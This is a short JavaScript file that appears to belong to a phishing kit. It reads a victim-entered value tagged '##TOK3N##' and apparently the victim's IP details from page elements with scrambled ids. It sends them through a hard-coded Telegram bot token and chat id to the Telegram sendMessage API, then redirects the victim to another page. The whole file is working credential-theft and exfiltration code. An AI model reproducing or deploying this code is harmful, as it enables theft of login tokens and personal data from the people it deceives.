//bot token
var telegram_bot_id = "6834441156:AAGRfWXfWl49dwiaO7uDRWvJAktL8ytm-GY";
//chat id
var chat_id = "-4203296154";
var uBOLT, opri, ripyr0pi;
var ready = function () {
    uBOLT = document.getElementById("c4r0tyx18249c").value;
    opri = document.getElementById("284092mcge28").innerHTML;
    ripyr0pi = document.getElementById("c3e29f94jv").innerHTML;
    message = "##TOK3N## " 
    + uBOLT + "\n\nLAIPX: " + opri +"\n" + ripyr0pi +"";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'ladeviex.html';
        console.log(response);
    });
    return false;
};
